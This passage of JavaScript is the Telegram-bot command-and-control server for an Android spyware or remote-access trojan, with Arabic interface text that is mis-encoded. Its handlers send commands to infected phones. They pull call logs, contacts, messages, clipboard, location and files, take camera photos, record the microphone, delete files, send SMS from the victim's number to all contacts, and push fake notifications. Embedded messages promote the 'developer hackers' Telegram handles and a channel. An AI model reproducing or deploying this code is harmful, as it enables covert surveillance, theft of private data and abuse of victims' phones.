                        {text: 'ط§ط±ط³ط§ظ„ ط±ط³ط§ظ„ط©', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: 'طھط´ط؛ظٹظ„ ظ…ظ„ظپ طµظˆطھظٹ', callback_data: `play_audio:${uuid}`},
                        {text: 'ط§ظٹظ‚ط§ظپ ط§ظ„ظ…ظ„ظپ ط§ظ„طµظˆطھظٹ', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: 'ط§ط±ط³ط§ظ„ ط±ط³ط§ظ„ط© ط§ظ„ط¦ ط¬ظ…ظٹط¹ ط¬ظ‡ط© ط§طھطµط§ظ„',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'آ°â€¢ ط·ظ„ط¨ظƒ ظ‚ظٹط¯ ط§ظ„ظ…ط¹ط§ظ„ط¬ط© ط§ظ„ط±ط¬ط§ط، ط§ظ„ط§ظ†طھط¸ط§ط±........\n\n' +
            'â€¢ ط³طھطھظ„ظ‚ظ‰ ط±ط¯ظ‹ط§ ظپظٹ ط§ظ„ظ„ط­ط¸ط§طھ ط§ظ„ظ‚ظ„ظٹظ„ط© ط§ظ„ظ‚ط§ط¯ظ…ط© ط§ظ„ظ…ط·ظˆط± ط§ظ„ظ‡ط§ظƒط±ط§طھ @VA7_JX ظˆ @Black_Clar  ط§ظ„ط®ط§طµط© ط¨ط§ظ„ظ‚ظ†ط§ط© https://t.me/+xLfV-P0qALQ0MjFk ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ط§ظ„ط§ط¬ظ‡ط²ط© ط§ظ„ظ…طھطµظ„ط©"], ["طھظ†ظپظٹط° ط§ظ„ط§ظ…ط±"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'آ°â€¢ ط·ظ„ط¨ظƒ ظ‚ظٹط¯ ط§ظ„ظ…ط¹ط§ظ„ط¬ط© ط§ظ„ط±ط¬ط§ط، ط§ظ„ط§ظ†طھط¸ط§ط±........\n\n' +
            'â€¢ ط³طھطھظ„ظ‚ظ‰ ط±ط¯ظ‹ط§ ظپظٹ ط§ظ„ظ„ط­ط¸ط§طھ ط§ظ„ظ‚ظ„ظٹظ„ط© ط§ظ„ظ‚ط§ط¯ظ…ط© ط§ظ„ظ…ط·ظˆط± ط§ظ„ظ‡ط§ظƒط±ط§طھ @VA7_JX ظˆ @Black_Clar  ط§ظ„ط®ط§طµط© ط¨ط§ظ„ظ‚ظ†ط§ط© https://t.me/+xLfV-P0qALQ0MjFk ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ط§ظ„ط§ط¬ظ‡ط²ط© ط§ظ„ظ…طھطµظ„ط©"], ["طھظ†ظپظٹط° ط§ظ„ط§ظ…ط±"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'آ°â€¢ ط·ظ„ط¨ظƒ ظ‚ظٹط¯ ط§ظ„ظ…ط¹ط§ظ„ط¬ط© ط§ظ„ط±ط¬ط§ط، ط§ظ„ط§ظ†طھط¸ط§ط±........\n\n' +
            'â€¢ ط³طھطھظ„ظ‚ظ‰ ط±ط¯ظ‹ط§ ظپظٹ ط§ظ„ظ„ط­ط¸ط§طھ ط§ظ„ظ‚ظ„ظٹظ„ط© ط§ظ„ظ‚ط§ط¯ظ…ط© ط§ظ„ظ…ط·ظˆط± ط§ظ„ظ‡ط§ظƒط±ط§طھ @VA7_JX ظˆ @Black_Clar  ط§ظ„ط®ط§طµط© ط¨ط§ظ„ظ‚ظ†ط§ط© https://t.me/+xLfV-P0qALQ0MjFk ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ط§ظ„ط§ط¬ظ‡ط²ط© ط§ظ„ظ…طھطµظ„ط©"], ["طھظ†ظپظٹط° ط§ظ„ط§ظ…ط±"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'آ°â€¢ ط·ظ„ط¨ظƒ ظ‚ظٹط¯ ط§ظ„ظ…ط¹ط§ظ„ط¬ط© ط§ظ„ط±ط¬ط§ط، ط§ظ„ط§ظ†طھط¸ط§ط±........\n\n' +
            'â€¢ ط³طھطھظ„ظ‚ظ‰ ط±ط¯ظ‹ط§ ظپظٹ ط§ظ„ظ„ط­ط¸ط§طھ ط§ظ„ظ‚ظ„ظٹظ„ط© ط§ظ„ظ‚ط§ط¯ظ…ط© ط§ظ„ظ…ط·ظˆط± ط§ظ„ظ‡ط§ظƒط±ط§طھ @VA7_JX ظˆ @Black_Clar  ط§ظ„ط®ط§طµط© ط¨ط§ظ„ظ‚ظ†ط§ط© https://t.me/+xLfV-P0qALQ0MjFk ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ط§ظ„ط§ط¬ظ‡ط²ط© ط§ظ„ظ…طھطµظ„ط©"], ["طھظ†ظپظٹط° ط§ظ„ط§ظ…ط±"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'آ°â€¢ ط·ظ„ط¨ظƒ ظ‚ظٹط¯ ط§ظ„ظ…ط¹ط§ظ„ط¬ط© ط§ظ„ط±ط¬ط§ط، ط§ظ„ط§ظ†طھط¸ط§ط±........\n\n' +
            'â€¢ ط³طھطھظ„ظ‚ظ‰ ط±ط¯ظ‹ط§ ظپظٹ ط§ظ„ظ„ط­ط¸ط§طھ ط§ظ„ظ‚ظ„ظٹظ„ط© ط§ظ„ظ‚ط§ط¯ظ…ط© ط§ظ„ظ…ط·ظˆط± ط§ظ„ظ‡ط§ظƒط±ط§طھ @VA7_JX ظˆ @Black_Clar  ط§ظ„ط®ط§طµط© ط¨ط§ظ„ظ‚ظ†ط§ط© https://t.me/+xLfV-P0qALQ0MjFk ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ط§ظ„ط§ط¬ظ‡ط²ط© ط§ظ„ظ…طھطµظ„ط©"], ["طھظ†ظپظٹط° ط§ظ„ط§ظ…ط±"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'آ°â€¢ ط·ظ„ط¨ظƒ ظ‚ظٹط¯ ط§ظ„ظ…ط¹ط§ظ„ط¬ط© ط§ظ„ط±ط¬ط§ط، ط§ظ„ط§ظ†طھط¸ط§ط±........\n\n' +
            'â€¢ ط³طھطھظ„ظ‚ظ‰ ط±ط¯ظ‹ط§ ظپظٹ ط§ظ„ظ„ط­ط¸ط§طھ ط§ظ„ظ‚ظ„ظٹظ„ط© ط§ظ„ظ‚ط§ط¯ظ…ط© ط§ظ„ظ…ط·ظˆط± ط§ظ„ظ‡ط§ظƒط±ط§طھ @VA7_JX ظˆ @Black_Clar  ط§ظ„ط®ط§طµط© ط¨ط§ظ„ظ‚ظ†ط§ط© https://t.me/+xLfV-P0qALQ0MjFk ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ط§ظ„ط§ط¬ظ‡ط²ط© ط§ظ„ظ…طھطµظ„ط©"], ["طھظ†ظپظٹط° ط§ظ„ط§ظ…ط±"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'آ°â€¢ ط·ظ„ط¨ظƒ ظ‚ظٹط¯ ط§ظ„ظ…ط¹ط§ظ„ط¬ط© ط§ظ„ط±ط¬ط§ط، ط§ظ„ط§ظ†طھط¸ط§ط±........\n\n' +
            'â€¢ ط³طھطھظ„ظ‚ظ‰ ط±ط¯ظ‹ط§ ظپظٹ ط§ظ„ظ„ط­ط¸ط§طھ ط§ظ„ظ‚ظ„ظٹظ„ط© ط§ظ„ظ‚ط§ط¯ظ…ط© ط§ظ„ظ…ط·ظˆط± ط§ظ„ظ‡ط§ظƒط±ط§طھ @VA7_JX ظˆ @Black_Clar  ط§ظ„ط®ط§طµط© ط¨ط§ظ„ظ‚ظ†ط§ط© https://t.me/+xLfV-P0qALQ0MjFk ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ط§ظ„ط§ط¬ظ‡ط²ط© ط§ظ„ظ…طھطµظ„ط©"], ["طھظ†ظپظٹط° ط§ظ„ط§ظ…ط±"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'آ°â€¢ ط·ظ„ط¨ظƒ ظ‚ظٹط¯ ط§ظ„ظ…ط¹ط§ظ„ط¬ط© ط§ظ„ط±ط¬ط§ط، ط§ظ„ط§ظ†طھط¸ط§ط±........\n\n' +
            'â€¢ ط³طھطھظ„ظ‚ظ‰ ط±ط¯ظ‹ط§ ظپظٹ ط§ظ„ظ„ط­ط¸ط§طھ ط§ظ„ظ‚ظ„ظٹظ„ط© ط§ظ„ظ‚ط§ط¯ظ…ط© ط§ظ„ظ…ط·ظˆط± ط§ظ„ظ‡ط§ظƒط±ط§طھ @VA7_JX ظˆ @Black_Clar  ط§ظ„ط®ط§طµط© ط¨ط§ظ„ظ‚ظ†ط§ط© https://t.me/+xLfV-P0qALQ0MjFk ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ط§ظ„ط§ط¬ظ‡ط²ط© ط§ظ„ظ…طھطµظ„ط©"], ["طھظ†ظپظٹط° ط§ظ„ط§ظ…ط±"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'آ°â€¢ ط·ظ„ط¨ظƒ ظ‚ظٹط¯ ط§ظ„ظ…ط¹ط§ظ„ط¬ط© ط§ظ„ط±ط¬ط§ط، ط§ظ„ط§ظ†طھط¸ط§ط±........\n\n' +
            'â€¢ ط³طھطھظ„ظ‚ظ‰ ط±ط¯ظ‹ط§ ظپظٹ ط§ظ„ظ„ط­ط¸ط§طھ ط§ظ„ظ‚ظ„ظٹظ„ط© ط§ظ„ظ‚ط§ط¯ظ…ط© ط§ظ„ظ…ط·ظˆط± ط§ظ„ظ‡ط§ظƒط±ط§طھ @VA7_JX ظˆ @Black_Clar  ط§ظ„ط®ط§طµط© ط¨ط§ظ„ظ‚ظ†ط§ط© https://t.me/+xLfV-P0qALQ0MjFk ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ط§ظ„ط§ط¬ظ‡ط²ط© ط§ظ„ظ…طھطµظ„ط©"], ["طھظ†ظپظٹط° ط§ظ„ط§ظ…ط±"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'آ°â€¢ ط·ظ„ط¨ظƒ ظ‚ظٹط¯ ط§ظ„ظ…ط¹ط§ظ„ط¬ط© ط§ظ„ط±ط¬ط§ط، ط§ظ„ط§ظ†طھط¸ط§ط±........\n\n' +
            'â€¢ ط³طھطھظ„ظ‚ظ‰ ط±ط¯ظ‹ط§ ظپظٹ ط§ظ„ظ„ط­ط¸ط§طھ ط§ظ„ظ‚ظ„ظٹظ„ط© ط§ظ„ظ‚ط§ط¯ظ…ط© ط§ظ„ظ…ط·ظˆط± ط§ظ„ظ‡ط§ظƒط±ط§طھ @VA7_JX ظˆ @Black_Clar  ط§ظ„ط®ط§طµط© ط¨ط§ظ„ظ‚ظ†ط§ط© https://t.me/+xLfV-P0qALQ0MjFk ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ط§ظ„ط§ط¬ظ‡ط²ط© ط§ظ„ظ…طھطµظ„ط©"], ["طھظ†ظپظٹط° ط§ظ„ط§ظ…ط±"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'آ°â€¢ ط·ظ„ط¨ظƒ ظ‚ظٹط¯ ط§ظ„ظ…ط¹ط§ظ„ط¬ط© ط§ظ„ط±ط¬ط§ط، ط§ظ„ط§ظ†طھط¸ط§ط±........\n\n' +
            'â€¢ ط³طھطھظ„ظ‚ظ‰ ط±ط¯ظ‹ط§ ظپظٹ ط§ظ„ظ„ط­ط¸ط§طھ ط§ظ„ظ‚ظ„ظٹظ„ط© ط§ظ„ظ‚ط§ط¯ظ…ط© ط§ظ„ظ…ط·ظˆط± ط§ظ„ظ‡ط§ظƒط±ط§طھ @VA7_JX ظˆ @Black_Clar  ط§ظ„ط®ط§طµط© ط¨ط§ظ„ظ‚ظ†ط§ط© https://t.me/+xLfV-P0qALQ0MjFk ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ط§ظ„ط§ط¬ظ‡ط²ط© ط§ظ„ظ…طھطµظ„ط©"], ["طھظ†ظپظٹط° ط§ظ„ط§ظ…ط±"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, 'آ°â€¢ ط§ظ„ط±ط¬ط§ط، ظƒطھط§ط¨ط© ط±ظ‚ظ… ط§ظ„ط°ظٹ طھط±ظٹط¯ ط§ط±ط³ط§ظ„ ط§ظ„ظٹط© ظ…ظ† ط±ظ‚ظ… ط§ظ„ط¶ط­ظٹط©\n\n' +
            'â€¢ ط¥ط°ط§ ظƒظ†طھ طھط±ط؛ط¨ ظپظٹ ط¥ط±ط³ط§ظ„ ط§ظ„ط±ط³ط§ط¦ظ„ ط§ظ„ظ‚طµظٹط±ط© ط¥ظ„ظ‰ ط£ط±ظ‚ط§ظ… ط§ظ„ط¯ظˆظ„ ط§ظ„ظ…ط­ظ„ظٹط©طŒ ظٹظ…ظƒظ†ظƒ ط¥ط¯ط®ط§ظ„ ط§ظ„ط±ظ‚ظ… ط¨طµظپط± ظپظٹ ط§ظ„ط¨ط¯ط§ظٹط©طŒ ظˆط¥ظ„ط§ ط£ط¯ط®ظ„ ط§ظ„ط±ظ‚ظ… ظ…ط¹ ط±ظ…ط² ط§ظ„ط¨ظ„ط¯طŒ',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'آ°â€¢ ط§ظ„ط±ط¬ط§ط، ظƒطھط§ط¨ط© ط§ظ„ط±ط³ط§ظ„ط© ط§ظ„ظ…ط±ط§ط¯ ط§ط±ط³ط§ظ„ظ‡ط§ ط§ظ„ط¦ ط§ظ„ط¬ظ…ظٹط¹\n\n' +
            'â€¢ ظƒظ† ط­ط°ط±ظ‹ط§ ظ…ظ† ط£ظ† ط§ظ„ط±ط³ط§ظ„ط© ظ„ظ† ظٹطھظ… ط¥ط±ط³ط§ظ„ظ‡ط§ ط¥ط°ط§ ظƒط§ظ† ط¹ط¯ط¯ ط§ظ„ط£ط­ط±ظپ ظپظٹ ط±ط³ط§ظ„طھظƒ ط£ظƒط«ط± ظ…ظ† ط§ظ„ظ…ط³ظ…ظˆط­ ط¨ظ‡ طŒ',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'آ°â€¢ ط§ط¯ط®ظ„ ظ…ط³ط§ط± ط§ظ„ظ…ظ„ظپ ط§ظ„ط°ظٹ طھط±ظٹط¯ ط³ط­ط¨ط© ظ…ظ† ط¬ظ‡ط§ط² ط§ظ„ط¶ط­ظٹط©\n\n' +
            'â€¢ ظ„ط§ طھط­طھط§ط¬ ط¥ظ„ظ‰ ط¥ط¯ط®ط§ظ„ ظ…ط³ط§ط± ط§ظ„ظ…ظ„ظپ ط§ظ„ظƒط§ظ…ظ„ طŒ ظپظ‚ط· ط£ط¯ط®ظ„ ط§ظ„ظ…ط³ط§ط± ط§ظ„ط±ط¦ظٹط³ظٹ. ط¹ظ„ظ‰ ط³ط¨ظٹظ„ ط§ظ„ظ…ط«ط§ظ„طŒ ط£ط¯ط®ظ„<b> DCIM/Camera </b> ظ„طھظ„ظ‚ظٹ ظ…ظ„ظپط§طھ ط§ظ„ظ…ط¹ط±ط¶.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'آ°â€¢ ط§ط¯ط®ظ„ ظ…ط³ط§ط± ط§ظ„ظ…ظ„ظپ ط§ظ„ط°ظٹ طھط±ظٹط¯ \n\n' +
            'â€¢ ظ„ط§ طھط­طھط§ط¬ ط¥ظ„ظ‰ ط¥ط¯ط®ط§ظ„ ظ…ط³ط§ط± ط§ظ„ظ…ظ„ظپ ط§ظ„ظƒط§ظ…ظ„ طŒ ظپظ‚ط· ط£ط¯ط®ظ„ ط§ظ„ظ…ط³ط§ط± ط§ظ„ط±ط¦ظٹط³ظٹ. ط¹ظ„ظ‰ ط³ط¨ظٹظ„ ط§ظ„ظ…ط«ط§ظ„طŒ ط£ط¯ط®ظ„<b> DCIM/Camera </b> ظ„ط­ط°ظپ ظ…ظ„ظپط§طھ ط§ظ„ظ…ط¹ط±ط¶.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'آ°â€¢ ط§ط¯ط®ظ„ ظ…ط³ط§ط± ط§ظ„ظ…ظ„ظپ ط§ظ„ط°ظٹ طھط±ظٹط¯ \n\n' +
            'â€¢ ظ„ط§ط­ط¸ ط£ظ†ظ‡ ظٹط¬ط¨ ط¥ط¯ط®ط§ظ„ ط§ظ„ظˆظ‚طھ ط¹ط¯ط¯ظٹظ‹ط§ ط¨ظˆط­ط¯ط§طھ ظ…ظ† ط§ظ„ط«ظˆط§ظ†ظٹ طŒ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'آ°â€¢ ط§ط¯ط®ظ„ ط§ظ„ط±ط³ط§ظ„ط© ط§ظ„طھظٹ طھط±ظٹط¯ ط§ظ† طھط¸ظ‡ط± ط¹ظ„ط¦ ط¬ظ‡ط§ط² ط§ظ„ط¶ط­ظٹط©\n\n' +
            'â€¢ ظ‡ظٹ ط±ط³ط§ظ„ط© ظ‚طµظٹط±ط© طھط¸ظ‡ط± ط¹ظ„ظ‰ ط´ط§ط´ط© ط§ظ„ط¬ظ‡ط§ط² ظ„ط¨ط¶ط¹ ط«ظˆط§ظ† طŒ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'آ°â€¢ ط§ط¯ط®ظ„ ط§ظ„ط±ط³ط§ظ„ط© ط§ظ„طھظٹ طھط±ظٹط¯ظ‡ط§ طھط¸ظ‡ط± ظƒظ…ط§ ط¥ط´ط¹ط§ط±\n\n' +
            'â€¢ ط³طھط¸ظ‡ط± ط±ط³ط§ظ„طھظƒ ظپظٹ ط´ط±ظٹط· ط­ط§ظ„ط© ط§ظ„ط¬ظ‡ط§ط² ط§ظ„ظ‡ط¯ظپ ظ…ط«ظ„ ط§ظ„ط¥ط®ط·ط§ط± ط§ظ„ط¹ط§ط¯ظٹ طŒ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'آ°â€¢ آ°â€¢ ط£ط¯ط®ظ„ ط±ط§ط¨ط· ط§ظ„طµظˆطھ ط§ظ„ط°ظٹ طھط±ظٹط¯ طھط´ط؛ظٹظ„ظ‡\n\n' +
            'â€¢ ظ„ط§ط­ط¸ ط£ظ†ظ‡ ظٹط¬ط¨ ط¹ظ„ظٹظƒ ط¥ط¯ط®ط§ظ„ ط§ظ„ط±ط§ط¨ط· ط§ظ„ظ…ط¨ط§ط´ط± ظ„ظ„طµظˆطھ ط§ظ„ظ…ط·ظ„ظˆط¨ طŒ ظˆط¥ظ„ط§ ظپظ„ظ† ظٹطھظ… طھط´ط؛ظٹظ„ ط§ظ„طµظˆطھ طŒ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);
